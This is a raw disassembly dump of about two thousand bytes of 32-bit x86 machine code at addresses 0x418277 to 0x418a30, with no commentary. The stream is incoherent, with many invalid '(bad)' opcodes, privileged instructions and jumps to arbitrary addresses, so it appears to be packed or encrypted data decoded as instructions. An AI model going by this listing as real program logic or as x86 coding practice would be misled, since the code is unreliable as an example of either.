  418277:	(bad)  
  418278:	cs jb  0x418245
  41827b:	stos   DWORD PTR es:[edi],eax
  41827c:	lahf   
  41827d:	pop    es
  41827e:	mov    esp,0xef4b93ec
  418283:	push   0x6e
  418285:	sbb    esp,DWORD PTR [ecx+0x23b8659d]
  41828b:	fs ror ebx,0x32
  41828f:	dec    eax
  418290:	arpl   WORD PTR [eax+0x43072382],sp
  418296:	stc    
  418297:	ret    0xabd
  41829a:	fstp   DWORD PTR [ebp-0x5f]
  41829d:	push   es
  41829e:	fsubrp st(5),st
  4182a0:	inc    edi
  4182a1:	jo     0x418288
  4182a3:	or     al,0x4
  4182a5:	dec    edx
  4182a6:	shl    eax,0x1e
  4182a9:	fbld   TBYTE PTR [ecx+0xe4ae9b3]
  4182af:	xchg   esi,eax
  4182b0:	jmp    0x4182c5
  4182b2:	pop    ds
  4182b3:	push   ebp
  4182b4:	cli    
  4182b5:	dec    ebp
  4182b6:	(bad)  
  4182b7:	int3   
  4182b8:	fwait
  4182b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ba:	cmp    DWORD PTR [esi+0x25],esi
  4182bd:	and    DWORD PTR [esi],ebp
  4182bf:	stos   BYTE PTR es:[edi],al
  4182c0:	sub    eax,0xb2551331
  4182c5:	cmc    
  4182c6:	and    BYTE PTR [edx-0x444ed5e1],al
  4182cc:	inc    esp
  4182cd:	cmp    ebp,edx
  4182cf:	jl     0x41833a
  4182d1:	push   ebx
  4182d2:	iret   
  4182d3:	inc    edi
  4182d4:	stos   DWORD PTR es:[edi],eax
  4182d5:	ja     0x418271
  4182d7:	dec    edx
  4182d8:	mov    esi,fs
  4182da:	in     eax,0x5a
  4182dc:	enter  0x85a6,0xec
  4182e0:	out    0xa7,al
  4182e2:	(bad)  
  4182e3:	mov    bl,0x4f
  4182e5:	(bad)  
  4182e6:	fsubr  st(0),st
  4182e8:	sub    bh,BYTE PTR [ecx-0x43]
  4182eb:	push   edx
  4182ec:	rol    BYTE PTR [esp+edx*4],0xc0
  4182f0:	iret   
  4182f1:	ret    0xcc57
  4182f4:	inc    esp
  4182f5:	jae    0x418288
  4182f7:	shr    DWORD PTR [ebp-0x446b6377],0x8b
  4182fe:	mov    ebp,0x79d402fc
  418303:	nop
  418304:	loop   0x418340
  418306:	(bad)  
  418307:	or     al,0x4
  418309:	jmp    0x628cce96
  41830e:	mov    bh,0xbc
  418310:	sbb    ebp,DWORD PTR [ebx]
  418312:	mov    WORD PTR ds:0xe20ab29,?
  418318:	push   edi
  418319:	inc    esi
  41831a:	int3   
  41831b:	jle    0x418310
  41831d:	frstor [edx]
  41831f:	stos   BYTE PTR es:[edi],al
  418320:	ror    DWORD PTR [edi-0x4f],0x7a
  418324:	pop    edi
  418325:	push   0xf8e78373
  41832a:	mov    dh,0x60
  41832c:	pop    es
  41832d:	push   esp
  41832e:	shr    BYTE PTR [edi],1
  418330:	jg     0x418378
  418332:	mov    ah,0xc7
  418334:	aas    
  418335:	jmp    0x91e484d9
  41833a:	add    eax,0xc6db5125
  41833f:	or     al,0x67
  418341:	nop
  418342:	jno    0x418385
  418344:	add    DWORD PTR [edx+0x5f],edx
  418347:	mov    si,0x7fe9
  41834b:	push   edi
  41834c:	retf   
  41834d:	sub    al,0x7e
  41834f:	add    ecx,DWORD PTR [ebp-0x39]
  418352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418353:	mov    cl,0x20
  418355:	imul   edi,DWORD PTR cs:[edi+0x4ea93656],0x1e
  41835d:	in     al,dx
  41835e:	mov    BYTE PTR [ecx+0x19e71f4f],ah
  418364:	xlat   BYTE PTR ds:[ebx]
  418365:	or     eax,0x1a17129b
  41836a:	mov    ecx,0x3351618
  41836f:	xor    ch,al
  418371:	gs mov dl,0x52
  418374:	add    BYTE PTR [edi-0x23],dl
  418377:	ds xchg ecx,eax
  418379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41837a:	jmp    0x4183d5
  41837c:	and    DWORD PTR [ecx-0x44],ebp
  41837f:	cmp    eax,0xb77cf8cf
  418384:	retf   0x2c3
  418387:	mov    fs,ebp
  418389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41838a:	mov    bh,0x39
  41838c:	sbb    ch,BYTE PTR [edx-0x4f97014a]
  418392:	adc    DWORD PTR [esi+0x6c548058],ebx
  418398:	sbb    dh,BYTE PTR [edx-0x31]
  41839b:	add    cl,ah
  41839d:	enter  0xebeb,0xa4
  4183a1:	sub    ebp,DWORD PTR [ecx+0xd]
  4183a4:	call   0x5cad:0x567cc9ff
  4183ab:	hlt    
  4183ac:	and    DWORD PTR [eax],0x441d790a
  4183b2:	dec    ecx
  4183b3:	out    0x1c,al
  4183b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b6:	ins    BYTE PTR es:[edi],dx
  4183b7:	fwait
  4183b8:	das    
  4183b9:	test   eax,0x88e19fcd
  4183be:	test   eax,0x8e94b28b
  4183c3:	mov    al,ds:0x95ab6238
  4183c8:	xchg   ebp,eax
  4183c9:	loopne 0x418391
  4183cb:	mov    fs,WORD PTR ss:[ecx-0x10e444ad]
  4183d2:	xchg   ebx,eax
  4183d3:	sbb    ah,bh
  4183d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d6:	std    
  4183d7:	inc    esp
  4183d8:	mov    bh,0xb7
  4183da:	fldenv [ecx-0x5e752ed0]
  4183e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183e1:	in     eax,dx
  4183e2:	jmp    0x583f:0x5e368c14
  4183e9:	rcr    DWORD PTR [edx+0x6f],cl
  4183ec:	xor    eax,0x31523e45
  4183f1:	sub    bl,ch
  4183f3:	inc    ecx
  4183f4:	inc    eax
  4183f5:	loopne 0x418433
  4183f7:	jg     0x41841b
  4183f9:	(bad)  
  4183fa:	pushf  
  4183fb:	pop    edx
  4183fc:	jae    0x4183e7
  4183fe:	(bad)  
  4183ff:	mov    ebx,0xf69d624d
  418404:	ret    
  418405:	mov    DWORD PTR [eax+ebx*8+0x3f],0xb28d38da
  41840d:	lods   eax,DWORD PTR ds:[esi]
  41840e:	bnd jae 0x41844c
  418411:	pop    es
  418412:	shr    DWORD PTR [esp+0x1bfbacf1],0x74
  41841a:	pusha  
  41841b:	push   es
  41841c:	stos   DWORD PTR es:[edi],eax
  41841d:	jmp    0xad4800fd
  418422:	repnz loopne 0x418460
  418425:	pusha  
  418426:	pop    ebp
  418427:	shl    BYTE PTR [ebp+0x10],0xc7
  41842b:	in     al,dx
  41842c:	stos   BYTE PTR es:[edi],al
  41842d:	lds    ecx,FWORD PTR [esp+ebp*8-0x7f]
  418431:	icebp  
  418432:	mov    ah,dl
  418434:	imul   esp,DWORD PTR [eax+0x68],0xffffff8d
  418438:	mov    esp,DWORD PTR [edx]
  41843a:	push   ds
  41843b:	mov    ebx,0x5a37e971
  418440:	xchg   ebp,eax
  418441:	fsub   DWORD PTR [edx]
  418443:	adc    eax,0xb1abe418
  418448:	enter  0x7497,0xb8
  41844c:	(bad)  
  41844d:	push   ebx
  41844e:	jge    0x4183e5
  418450:	fwait
  418451:	pop    esp
  418452:	cwde   
  418453:	jo     0x418485
  418455:	jns    0x418409
  418457:	daa    
  418458:	ror    BYTE PTR [edi+ebp*4+0x5f5252e4],0x0
  418460:	xor    dh,bh
  418462:	hlt    
  418463:	hlt    
  418464:	push   0x3df94475
  418469:	gs mov dh,0xcf
  41846c:	cmp    al,0x5c
  41846e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41846f:	data16 jecxz 0x41843b
  418472:	(bad)
  418475:	js     0x41841b
  418477:	fdivr  QWORD PTR [ebx+0x7dffe4fc]
  41847d:	pop    ds
  41847e:	test   BYTE PTR [edi+ebx*1-0x7a0f7d71],al
  418485:	pop    esi
  418486:	inc    ecx
  418487:	mov    ah,0x90
  418489:	rcl    BYTE PTR fs:[ebx+0x3d5452a0],cl
  418490:	jle    0x41844b
  418492:	bound  ebp,QWORD PTR [esi+0x5aec211]
  418498:	push   ecx
  418499:	jne    0x418443
  41849b:	jle    0x418439
  41849d:	sbb    esi,DWORD PTR [ebp-0x52]
  4184a0:	fisubr WORD PTR [bp+di+0x44]
  4184a4:	shr    DWORD PTR [ecx+0x58891d70],1
  4184aa:	inc    edx
  4184ab:	xchg   DWORD PTR [esi],ebp
  4184ad:	jp     0x41849f
  4184af:	popfw  
  4184b1:	cmp    eax,0x2be7d13a
  4184b6:	sub    DWORD PTR [esp+edx*1-0x29c2da4b],eax
  4184bd:	test   dh,bl
  4184bf:	ins    BYTE PTR es:[edi],dx
  4184c0:	sub    al,0x5
  4184c2:	dec    eax
  4184c3:	or     esi,DWORD PTR [ebp+ecx*2-0x68]
  4184c7:	sbb    BYTE PTR [edx+0x5a],dh
  4184ca:	mov    esi,DWORD PTR [edx]
  4184cc:	xor    ah,BYTE PTR [edi+0x1d]
  4184cf:	fsubr  QWORD PTR [ebp-0xa12679f]
  4184d5:	jmp    0x542449d3
  4184da:	xor    eax,0x6aa870c3
  4184df:	(bad)  
  4184e0:	(bad)  
  4184e1:	xchg   esi,eax
  4184e2:	push   ebx
  4184e3:	retf   
  4184e4:	jmp    0x3400202
  4184e9:	jns    0x4184cd
  4184eb:	adc    DWORD PTR [ecx+ebx*2+0x6a],0x6e
  4184f0:	and    BYTE PTR [edx-0x1675e830],ah
  4184f6:	add    cl,BYTE PTR [esi]
  4184f8:	daa    
  4184f9:	xchg   ebx,eax
  4184fa:	xchg   DWORD PTR [ecx-0x68],ebx
  4184fd:	ins    DWORD PTR es:[edi],dx
  4184fe:	in     al,0xb1
  418500:	mov    edx,0x85645b59
  418505:	mov    eax,0x8758283b
  41850a:	xchg   esp,eax
  41850b:	sub    dl,ch
  41850d:	pushf  
  41850e:	inc    esi
  41850f:	test   eax,0x1187908b
  418514:	and    BYTE PTR [ebx-0x2e],0x7a
  418518:	xlat   BYTE PTR ds:[ebx]
  418519:	cs pop edi
  41851b:	adc    ecx,ebp
  41851d:	jg     0x418548
  41851f:	add    BYTE PTR [esi-0x76],dl
  418522:	sub    dh,BYTE PTR [esi]
  418524:	ja     0x4184d7
  418526:	test   eax,0x63577fb0
  41852b:	out    dx,eax
  41852c:	and    al,BYTE PTR [edi+0x7d]
  41852f:	and    al,BYTE PTR [ecx]
  418531:	adc    edx,0x1c
  418534:	mov    edi,0xe6756fa3
  418539:	inc    edi
  41853a:	sub    DWORD PTR [ebp-0x6f],0xa86dcb90
  418541:	fs jno 0x4184c5
  418544:	sub    edx,ebx
  418546:	and    eax,0xd50c86dc
  41854b:	add    esi,0x6f
  41854e:	cmp    al,0xfe
  418550:	loope  0x418509
  418552:	jp     0x41855d
  418554:	lock (bad) 
  418556:	into   
  418557:	icebp  
  418558:	imul   bx,WORD PTR [ebp-0x7330b6b1],0xffd0
  418560:	xchg   ebp,eax
  418561:	clc    
  418562:	lock push ebp
  418564:	(bad)  
  418566:	sbb    DWORD PTR [edx-0x57],ebx
  418569:	jmp    0x418570
  41856b:	mov    DWORD PTR [edi-0x213afcc],0xbfab4c6f
  418575:	mov    eax,0x26fe0a03
  41857a:	icebp  
  41857b:	push   cs
  41857c:	pop    es
  41857d:	dec    ecx
  41857e:	outs   dx,BYTE PTR ds:[esi]
  41857f:	loop   0x4185ab
  418581:	xchg   edx,eax
  418582:	(bad)  
  418583:	and    ebp,ebp
  418585:	push   cs
  418586:	out    dx,al
  418587:	clc    
  418588:	xchg   edx,eax
  418589:	and    bh,bh
  41858b:	outs   dx,DWORD PTR ds:[esi]
  41858c:	in     eax,0xc0
  41858e:	jae    0x41860d
  418590:	push   esi
  418591:	call   0xb78c:0xe560b65b
  418598:	pop    edi
  418599:	sbb    al,BYTE PTR [esp+ebp*4-0x36b8708]
  4185a0:	ss in  al,dx
  4185a2:	mov    eax,DWORD PTR [edx]
  4185a4:	sbb    al,0x6
  4185a6:	pop    edi
  4185a7:	hlt    
  4185a8:	sbb    al,0x34
  4185aa:	adc    eax,0x5a5de2ca
  4185af:	cmp    edi,edx
  4185b1:	sbb    dl,BYTE PTR [ecx+0x5e0dd447]
  4185b7:	pop    esi
  4185b8:	jno    0x4185e5
  4185ba:	cmp    ah,0xf0
  4185bd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4185bf:	lods   eax,DWORD PTR ds:[esi]
  4185c0:	(bad)
  4185c3:	scas   al,BYTE PTR es:[edi]
  4185c4:	jo     0x418566
  4185c6:	and    eax,0xf3d3b075
  4185cb:	pop    eax
  4185cc:	aad    0x88
  4185ce:	repnz mov ecx,0x166a49b8
  4185d4:	jno    0x418640
  4185d6:	mov    eax,0x57f1e03b
  4185db:	das    
  4185dc:	add    eax,0x42609d8c
  4185e1:	(bad)  
  4185e3:	xor    al,0x41
  4185e5:	data16 aad 0xc
  4185e8:	pop    DWORD PTR [eax+0x122f3151]
  4185ee:	push   ebp
  4185ef:	das    
  4185f0:	jae    0x4185f9
  4185f2:	(bad)  
  4185f3:	arpl   WORD PTR [edx],si
  4185f5:	xor    ah,BYTE PTR [edx-0x20d65b92]
  4185fb:	sahf   
  4185fc:	cmp    dl,dl
  4185fe:	fidiv  WORD PTR [edi+0x1f]
  418601:	sbb    al,0xc8
  418603:	add    eax,ebp
  418605:	dec    esi
  418606:	or     DWORD PTR [ebx+0x5d],esi
  418609:	sub    al,0x1a
  41860b:	stos   DWORD PTR es:[edi],eax
  41860c:	inc    edx
  41860d:	mov    esi,0x65020333
  418612:	jecxz  0x41864b
  418614:	aas    
  418615:	pop    edx
  418616:	mov    ds:0x5a420fd2,al
  41861b:	mov    esi,ebp
  41861d:	ret    0x4bb
  418620:	sbb    al,0x27
  418622:	cdq    
  418623:	(bad)  
  418625:	dec    eax
  418626:	test   eax,0x7796e636
  41862b:	test   BYTE PTR [ebp-0x7f],ch
  41862e:	lods   al,BYTE PTR ds:[esi]
  41862f:	or     BYTE PTR [esi+0x16656747],ch
  418635:	jge    0x418654
  418637:	call   FWORD PTR [esi]
  418639:	std    
  41863a:	xchg   DWORD PTR [ecx+0x1d51d66f],ebp
  418640:	xchg   DWORD PTR [edi],esi
  418642:	call   0x1afc:0x3e66a47c
  418649:	mov    ch,0x1b
  41864b:	in     al,dx
  41864c:	fwait
  41864d:	pushf  
  41864e:	add    al,0xa1
  418650:	mov    ebx,0x1a61b2cd
  418655:	or     DWORD PTR [ebx+0x3bb1a08b],edi
  41865b:	cmp    bl,BYTE PTR [esp+ebp*1+0x7320c8ee]
  418662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418663:	xor    eax,DWORD PTR [edi]
  418665:	hlt    
  418666:	push   ss
  418667:	out    dx,al
  418668:	js     0x4186b8
  41866a:	pop    ecx
  41866b:	push   ds
  41866c:	loop   0x418605
  41866e:	rol    DWORD PTR [esi-0x1ab8f08b],0x31
  418675:	sbb    edi,DWORD PTR [edx+0x65eb6faf]
  41867b:	inc    ebp
  41867c:	xchg   edi,eax
  41867d:	pop    esi
  41867e:	bound  eax,QWORD PTR [edi-0x3b]
  418681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418682:	mov    edx,0xb3b0dc94
  418687:	pop    ebp
  418688:	mov    bl,0x51
  41868a:	loope  0x4186e8
  41868c:	aaa    
  41868d:	or     eax,0x70a20e2e
  418692:	(bad)  
  418693:	das    
  418694:	jle    0x4186d6
  418696:	pop    ebp
  418697:	fnstcw WORD PTR [eax-0x4694d50f]
  41869d:	push   ss
  41869e:	fild   WORD PTR [ecx]
  4186a0:	cmp    ah,BYTE PTR [eax]
  4186a2:	jp     0x418643
  4186a4:	jge    0x41867b
  4186a6:	adc    ah,BYTE PTR [edx+0x4ee3ba98]
  4186ac:	aam    0xc8
  4186ae:	push   ecx
  4186af:	cmp    esp,DWORD PTR [ebx]
  4186b1:	in     al,0x1d
  4186b3:	or     edi,esi
  4186b5:	sar    ah,0x8d
  4186b8:	mov    DWORD PTR [eax+ebx*1-0x4e],esi
  4186bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186bd:	and    BYTE PTR [eax+0x54],dh
  4186c0:	add    eax,0x8c517607
  4186c5:	sub    eax,0xc5f63b25
  4186ca:	repz and al,0xc6
  4186cd:	sbb    dh,BYTE PTR [eax]
  4186cf:	addr16 dec esp
  4186d1:	scas   al,BYTE PTR es:[edi]
  4186d2:	pop    eax
  4186d3:	in     eax,0x4a
  4186d5:	pop    es
  4186d6:	dec    esp
  4186d7:	(bad)  
  4186d8:	cmc    
  4186d9:	(bad)  
  4186da:	scas   al,BYTE PTR es:[edi]
  4186db:	or     ebx,DWORD PTR [edi]
  4186dd:	push   cs
  4186de:	push   ss
  4186df:	sub    eax,0x55225e97
  4186e4:	inc    edx
  4186e5:	cmc    
  4186e6:	pop    eax
  4186e7:	xor    esp,DWORD PTR [edi+eiz*2]
  4186ea:	je     0x418687
  4186ec:	dec    edx
  4186ed:	out    dx,al
  4186ee:	stos   DWORD PTR es:[edi],eax
  4186ef:	lea    edx,[edx+0x469ac6f2]
  4186f5:	jg     0x418743
  4186f7:	sahf   
  4186f8:	jmp    0x4186f8
  4186fa:	jge    0x41869e
  4186fc:	push   cs
  4186fd:	cmp    BYTE PTR [edx],0x71
  418700:	mov    eax,ds:0x90d43e11
  418705:	fdiv   DWORD PTR [eax]
  418707:	fcomp  DWORD PTR [edx+0x67]
  41870a:	mov    ds:0x7cfd30ff,eax
  41870f:	xchg   edi,esi
  418711:	mov    ebp,0xbc060b05
  418716:	test   esp,esi
  418718:	dec    ecx
  418719:	jno    0x418723
  41871b:	stos   BYTE PTR es:[edi],al
  41871c:	xor    dh,BYTE PTR [ecx-0x47acbe16]
  418722:	imul   ebx
  418724:	jb     0x41877c
  418726:	in     eax,dx
  418727:	sub    WORD PTR [ecx],bx
  41872a:	fwait
  41872b:	lock into 
  41872d:	add    DWORD PTR [edi+0xb2b9aa4],ebp
  418733:	rol    DWORD PTR [ecx-0x650e0efb],0xb9
  41873a:	(bad)  
  41873b:	push   0xc56b82ee
  418740:	xchg   ecx,eax
  418741:	stos   DWORD PTR es:[edi],eax
  418742:	sub    al,0x7b
  418744:	out    dx,eax
  418745:	inc    ecx
  418746:	inc    esp
  418747:	arpl   WORD PTR [ebx],bx
  418749:	daa    
  41874a:	inc    DWORD PTR ds:0x2de8ace8
  418750:	add    BYTE PTR [eax+0x69],cl
  418753:	mov    ds:0x8dcc04bb,al
  418758:	cli    
  418759:	int    0x6f
  41875b:	iret   
  41875c:	stos   BYTE PTR es:[edi],al
  41875d:	(bad)  
  41875e:	inc    eax
  41875f:	lea    esi,[edx]
  418761:	stc    
  418762:	pop    edi
  418763:	push   ebp
  418764:	je     0x41879d
  418766:	leave  
  418767:	push   esi
  418768:	fild   QWORD PTR [edi+ebx*8-0x30]
  41876c:	cmp    dl,BYTE PTR [edx+edx*4+0x6d]
  418770:	add    ebp,edi
  418772:	sub    al,BYTE PTR [ebp+0x55]
  418775:	stc    
  418776:	or     ecx,edi
  418778:	and    esi,DWORD PTR ds:0x24e2d31c
  41877e:	jbe    0x41878e
  418780:	imul   ecx,DWORD PTR [ebx+0x45],0xfffffff2
  418784:	add    BYTE PTR ds:0xf8228263,0xc8
  41878b:	push   cs
  41878c:	jnp    0x4187d4
  41878e:	retf   
  41878f:	js     0x418800
  418791:	ds jecxz 0x4187b5
  418794:	mov    DWORD PTR [edi+ebp*2+0x43389add],ebx
  41879b:	push   ebx
  41879c:	dec    ebp
  41879d:	inc    ecx
  41879e:	outs   dx,BYTE PTR ds:[esi]
  41879f:	mov    bh,0x4
  4187a1:	and    al,BYTE PTR [edi+esi*8+0x29c31239]
  4187a8:	mov    cl,BYTE PTR [edi-0x53]
  4187ab:	push   edx
  4187ac:	or     ch,BYTE PTR [edi-0x3571b49e]
  4187b2:	cdq    
  4187b3:	push   esp
  4187b4:	jo     0x4187b6
  4187b6:	jmp    0xf8cd16b2
  4187bb:	ja     0x4187d7
  4187bd:	xchg   ecx,eax
  4187be:	clc    
  4187bf:	cmp    ebp,DWORD PTR [esi+0x4]
  4187c2:	sahf   
  4187c3:	or     al,0xaa
  4187c5:	add    eax,0xd87790e9
  4187ca:	rcr    BYTE PTR ds:0x5074cece,0xd
  4187d1:	adc    cl,BYTE PTR [ebx-0x454bbf12]
  4187d7:	sub    eax,0xdab34993
  4187dc:	pop    ecx
  4187dd:	out    0x45,al
  4187df:	xor    esp,ecx
  4187e1:	sub    DWORD PTR [esi-0x3ae45629],ecx
  4187e7:	cmp    dl,bh
  4187e9:	xchg   ebx,eax
  4187ea:	and    esi,DWORD PTR [ebx+0x442c705b]
  4187f0:	cli    
  4187f1:	push   0xffffff8c
  4187f3:	add    eax,0xa310fea9
  4187f8:	pop    eax
  4187fa:	dec    cl
  4187fc:	ror    al,cl
  4187fe:	push   edx
  4187ff:	xor    esi,DWORD PTR [ebx+0x2262875e]
  418805:	jns    0x4187d0
  418807:	adc    DWORD PTR [edi],0xb235cfc
  41880d:	loope  0x4187a6
  41880f:	retf   
  418810:	adc    al,0xa0
  418812:	into   
  418813:	xchg   esi,eax
  418814:	mov    esp,0xff726eb2
  418819:	(bad)  
  41881a:	ror    BYTE PTR [edi+0x65],0x70
  41881e:	cwde   
  41881f:	mov    BYTE PTR [ecx+ecx*1],bl
  418822:	cs pop esi
  418824:	inc    BYTE PTR [ebp+0x13]
  418827:	jmp    0x63437eeb
  41882c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41882d:	dec    ebp
  41882e:	xor    eax,0x91cefc31
  418833:	into   
  418834:	jg     0x418877
  418836:	lds    esp,FWORD PTR [esi-0xe466d62]
  41883c:	push   es
  41883d:	jp     0x4187fb
  41883f:	jns    0x41887c
  418841:	add    al,0x44
  418843:	loope  0x418859
  418845:	cmp    al,0x3d
  418847:	sbb    ah,BYTE PTR [esi-0x7879e07a]
  41884d:	test   BYTE PTR [edx+0x6d37f213],0x4
  418854:	xor    DWORD PTR [eax],ebx
  418856:	jge    0x418887
  418858:	jecxz  0x418835
  41885a:	sahf   
  41885b:	and    eax,0xd2733fb4
  418860:	ret    
  418861:	dec    esp
  418862:	(bad)  
  418863:	test   eax,0x7a487a4c
  418868:	adc    DWORD PTR [ebx+0x28],ebp
  41886b:	mov    ebx,0xaf20e73a
  418870:	aas    
  418871:	(bad)  
  418872:	fbstp  TBYTE PTR [ebp+0x4f99a35b]
  418878:	xchg   esp,eax
  418879:	jo     0x418827
  41887b:	inc    edx
  41887c:	push   edi
  41887d:	rcl    DWORD PTR [esi+edx*2],1
  418880:	icebp  
  418881:	in     al,0x6c
  418883:	inc    esi
  418884:	test   BYTE PTR ds:0x20cfefda,bh
  41888a:	outs   dx,DWORD PTR gs:[esi]
  41888c:	aas    
  41888d:	dec    esi
  41888e:	push   esp
  41888f:	lods   al,BYTE PTR ds:[esi]
  418890:	and    al,0x19
  418892:	sbb    al,0xcf
  418894:	adc    al,0xf9
  418896:	(bad)  
  418897:	pop    eax
  418898:	inc    eax
  418899:	add    BYTE PTR [eax+0x3f],bl
  41889c:	aaa    
  41889d:	mov    dh,0xcc
  41889f:	scas   eax,DWORD PTR es:[edi]
  4188a0:	rcl    BYTE PTR [ebp+0x22],0x88
  4188a4:	cmp    bl,BYTE PTR [ebx+0x3d]
  4188a7:	int3   
  4188a8:	(bad)  
  4188a9:	push   esp
  4188aa:	ss jmp 0xf2b0:0x8c4521a
  4188b2:	xlat   BYTE PTR ds:[ebx]
  4188b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188b4:	lods   al,BYTE PTR ds:[esi]
  4188b5:	add    DWORD PTR [ebx+0x59a3073b],ebp
  4188bb:	dec    edi
  4188bc:	sub    esi,DWORD PTR [ecx]
  4188be:	shl    BYTE PTR [ebx+0x49],1
  4188c1:	inc    ebx
  4188c2:	(bad)  
  4188c3:	outs   dx,DWORD PTR ds:[esi]
  4188c4:	jae    0x4188e4
  4188c6:	sar    BYTE PTR [ebx+0xb],1
  4188c9:	std    
  4188ca:	add    cl,dh
  4188cc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4188ce:	das    
  4188cf:	loope  0x4188d5
  4188d1:	clc    
  4188d2:	sbb    eax,0x300aacb8
  4188d7:	mov    al,cl
  4188d9:	retf   
  4188da:	sahf   
  4188db:	push   ebp
  4188dc:	adc    ebx,DWORD PTR [edx]
  4188de:	imul   edx,DWORD PTR [ebx],0xffffffbe
  4188e1:	jno    0x4188e5
  4188e3:	cmp    BYTE PTR [eax-0x38e8db],ah
  4188e9:	mov    WORD PTR [ebx+0x7325630c],ss
  4188ef:	sbb    DWORD PTR gs:[ecx+0x8],ebp
  4188f3:	in     al,dx
  4188f4:	xchg   edi,eax
  4188f5:	mov    bl,ah
  4188f7:	cmp    eax,DWORD PTR [esi]
  4188f9:	or     cl,BYTE PTR [esi-0x3f953b22]
  4188ff:	out    0x68,eax
  418901:	daa    
  418902:	gs sub bl,cl
  418905:	lds    edi,FWORD PTR [esi-0x2bb07449]
  41890b:	call   0x7006411c
  418910:	xchg   esi,eax
  418911:	imul   DWORD PTR [eax+0x7e812dc0]
  418917:	repnz pushf 
  418919:	jbe    0x4188ab
  41891b:	ror    edi,cl
  41891d:	ins    DWORD PTR es:[edi],dx
  41891e:	arpl   WORD PTR [esi],dx
  418920:	aad    0x8c
  418922:	ins    BYTE PTR es:[edi],dx
  418923:	xor    eax,0xf21b4f13
  418928:	loopne 0x4188c4
  41892a:	add    ebx,ebp
  41892c:	sbb    DWORD PTR [ebx],0x5b
  41892f:	mov    dh,0xb6
  418931:	push   edi
  418932:	into   
  418933:	icebp  
  418934:	fistp  DWORD PTR [edx+edi*1-0x23]
  418938:	ds rcr dh,cl
  41893b:	push   esp
  41893c:	enter  0xdce3,0xc3
  418940:	mov    ecx,ecx
  418942:	dec    esi
  418943:	cmp    al,0x76
  418945:	fidiv  WORD PTR [edx]
  418947:	dec    esi
  418948:	aad    0x58
  41894a:	jl     0x418977
  41894c:	aam    0xdf
  41894e:	dec    esp
  41894f:	sub    al,0xea
  418951:	fwait
  418952:	push   esp
  418953:	in     eax,0x9b
  418955:	mov    esi,0x2d1b00b3
  41895a:	add    eax,0x9a4214e2
  41895f:	lahf   
  418960:	iret   
  418961:	push   eax
  418962:	push   es
  418963:	leave  
  418964:	push   cs
  418965:	out    dx,al
  418966:	repnz mov ?,WORD PTR [edx]
  418969:	ss sti 
  41896b:	lods   eax,DWORD PTR ds:[esi]
  41896c:	xor    eax,0xfdae9b90
  418971:	add    ebp,edi
  418973:	(bad)  
  418974:	ins    BYTE PTR es:[edi],dx
  418975:	pop    ds
  418976:	xor    ebp,DWORD PTR [ebp-0x6f]
  418979:	call   0xda09:0xf90c3616
  418980:	xchg   DWORD PTR [ecx+0x70],ebp
  418983:	sub    cl,BYTE PTR [ebx]
  418985:	dec    eax
  418986:	test   al,0xcd
  418988:	jecxz  0x41891f
  41898a:	and    DWORD PTR gs:[ebx],esi
  41898d:	inc    ecx
  41898e:	mov    WORD PTR gs:[eax+0x64],?
  418992:	retf   0xfc9f
  418995:	ss daa 
  418997:	and    DWORD PTR [esi+0x25],edi
  41899a:	(bad)  
  41899b:	mov    ah,0x93
  41899d:	(bad)  
  41899f:	scas   eax,DWORD PTR es:[edi]
  4189a0:	pop    eax
  4189a1:	pusha  
  4189a2:	mov    edx,esi
  4189a4:	arpl   WORD PTR [edi],si
  4189a6:	xchg   edx,eax
  4189a7:	mov    dl,0x85
  4189a9:	xor    dl,bh
  4189ab:	pushf  
  4189ac:	cmp    eax,0xe923d332
  4189b1:	(bad)  
  4189b2:	xchg   esp,eax
  4189b3:	xchg   edx,eax
  4189b4:	scas   al,BYTE PTR es:[edi]
  4189b5:	popa   
  4189b6:	mov    edx,DWORD PTR [ebx+0x3b50c161]
  4189bc:	mov    esi,0xd1daf539
  4189c1:	jnp    0x4189b4
  4189c3:	fldenv [ebp+0x359db071]
  4189c9:	dec    edx
  4189ca:	fidivr DWORD PTR [ecx-0x3b]
  4189cd:	cmp    BYTE PTR [esp+ebx*2+0x19],0x2c
  4189d2:	push   esp
  4189d3:	or     al,0x3e
  4189d5:	test   BYTE PTR [ebx],al
  4189d7:	stos   BYTE PTR es:[edi],al
  4189d8:	jbe    0x41897f
  4189da:	jp     0x4189b7
  4189dc:	pop    edi
  4189dd:	enter  0xe245,0xe0
  4189e1:	das    
  4189e2:	int3   
  4189e3:	dec    eax
  4189e4:	push   ds
  4189e5:	pop    ebp
  4189e6:	push   0x44e9424f
  4189eb:	and    BYTE PTR [esi+0x1750176c],ch
  4189f1:	pop    es
  4189f2:	push   ebp
  4189f3:	call   0xf543:0x5a5b1df2
  4189fa:	into   
  4189fb:	div    BYTE PTR [eax-0x4cd3aad]
  418a01:	imul   edx,DWORD PTR [edx],0xfffffff0
  418a04:	dec    ebx
  418a05:	dec    edx
  418a06:	pop    ds
  418a07:	inc    esp
  418a08:	mov    cl,0xe7
  418a0a:	push   ss
  418a0b:	enter  0x2501,0x79
  418a0f:	xchg   esi,eax
  418a10:	xor    al,0x9f
  418a12:	pop    edi
  418a13:	and    BYTE PTR [esi+edi*1-0xc],bh
  418a17:	xor    al,0xac
  418a19:	xchg   ecx,eax
  418a1a:	jl     0x418a52
  418a1c:	mov    BYTE PTR [ecx],ch
  418a1e:	or     al,BYTE PTR [edi+eiz*1+0x3e5ad0c9]
  418a25:	xchg   DWORD PTR [ebx-0x2960e5],edi
  418a2b:	lock pop es
  418a2d:	scas   al,BYTE PTR es:[edi]
  418a2e:	in     al,dx
  418a2f:	dec    eax
  418a30:	mov    ecx,0x93aa43aa
